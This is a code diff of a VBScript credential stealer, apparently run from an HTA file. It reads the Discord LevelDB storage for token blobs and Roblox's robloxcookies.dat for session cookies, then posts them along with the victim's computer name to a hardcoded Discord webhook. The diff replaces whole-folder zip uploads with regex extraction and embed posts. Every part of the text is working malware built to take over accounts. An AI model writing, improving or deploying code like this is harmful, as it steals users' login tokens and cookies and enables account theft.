@@ -15,45 +15,59 @@ WH = "https://discord.com/api/webhooks/1568136262374793286/U6lNQnkvy-NdMd-nOUZQ7
 
 appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
 localappdata = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
-temp = sh.ExpandEnvironmentStrings("%TEMP%")
 
 ' Send an initial hit so you know it ran
 Call PostEmbed(":satellite: Hit", "PC: " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%"), 3447003)
 
-' 1. Grab Discord LevelDB files (zips the folder natively)
-Dim dPath, zipPath, file, content
+' 1. Grab Discord Tokens (Raw text extraction)
+Dim dPath, dFolder, file, raw, rx, matches, m
 dPath = appdata & "\discord\Local Storage\leveldb"
+
 If fso.FolderExists(dPath) Then
-    zipPath = temp & "\dc.zip"
-    ' Use native Windows tar to zip the folder without PowerShell
-    sh.Run "cmd.exe /c tar -a -c -f """ & zipPath & """ -C """ & dPath & """ .", 0, True
-    If fso.FileExists(zipPath) Then
-        content = ReadFileBinary(zipPath)
-        If Len(content) > 0 Then Call PostFile("Discord_LevelDB.zip", content)
-        fso.DeleteFile zipPath, True
-    End If
+    Set dFolder = fso.GetFolder(dPath)
+    Set rx = CreateObject("VBScript.RegExp")
+    rx.Pattern = "dQw4w9WgXcQ:[A-Za-z0-9+/=]+"
+    rx.Global = True
+    
+    For Each file In dFolder.Files
+        If LCase(Right(file.Name, 4)) = ".ldb" Or LCase(Right(file.Name, 4)) = ".log" Then
+            Dim f : Set f = fso.OpenTextFile(file.Path, 1, False)
+            raw = f.ReadAll
+            f.Close
+            
+            If InStr(raw, "dQw4w9WgXcQ:") > 0 Then
+                Set matches = rx.Execute(raw)
+                For Each m In matches
+                    Call PostEmbed(":gift: Discord Token Blob", m.Value, 5793266)
+                Next
+            End If
+        End If
+    Next
 End If
 
-' 2. Grab Roblox cookie file
+' 2. Grab Roblox Cookie (Raw text extraction)
 Dim rPath
 rPath = localappdata & "\Roblox\LocalStorage\robloxcookies.dat"
 If fso.FileExists(rPath) Then
-    content = ReadFileBinary(rPath)
-    If Len(content) > 0 Then Call PostFile("robloxcookies.dat", content)
+    Dim f2 : Set f2 = fso.OpenTextFile(rPath, 1, False)
+    raw = f2.ReadAll
+    f2.Close
+    
+    ' Extract the plaintext cookie if it exists
+    Set rx = CreateObject("VBScript.RegExp")
+    rx.Pattern = "_\|WARNING[^""]+"
+    rx.IgnoreCase = True
+    
+    Set matches = rx.Execute(raw)
+    If matches.Count > 0 Then
+        Call PostEmbed(":cookie: Roblox Cookie", matches(0).Value, 65280)
+    Else
+        ' If encrypted, send the raw dat string (first 1500 chars)
+        If Len(raw) > 50 Then Call PostEmbed(":cookie: Roblox Encrypted", Left(raw, 1500) & "...", 16776960)
+    End If
 End If
 
 window.close()
-
-Function ReadFileBinary(path)
-    ReadFileBinary = ""
-    Dim s : Set s = CreateObject("ADODB.Stream")
-    s.Type = 1 : s.Open
-    On Error Resume Next
-    s.LoadFromFile path
-    If Err.Number = 0 Then ReadFileBinary = s.Read
-    s.Close
-    On Error GoTo 0
-End Function
 
 Sub PostEmbed(t, d, c)
     Dim DQ: DQ = Chr(34)
@@ -63,23 +77,6 @@ Sub PostEmbed(t, d, c)
     h.Open "POST", WH, False
     h.SetRequestHeader "Content-Type", "application/json"
     h.Send j
-End Sub
-
-Sub PostFile(fn, ct)
-    Dim DQ: DQ = Chr(34)
-    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
-    Dim crlf: crlf = vbCrLf
-    Dim body
-    body = "--" & b & crlf
-    body = body & "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & crlf
-    body = body & "Content-Type: application/octet-stream" & crlf & crlf
-    body = body & ct & crlf
-    body = body & "--" & b & "--" & crlf
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    h.SetOption 2, 13056
-    h.Open "POST", WH, False
-    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
-    h.Send body
 End Sub
 
 Function Ej(s)
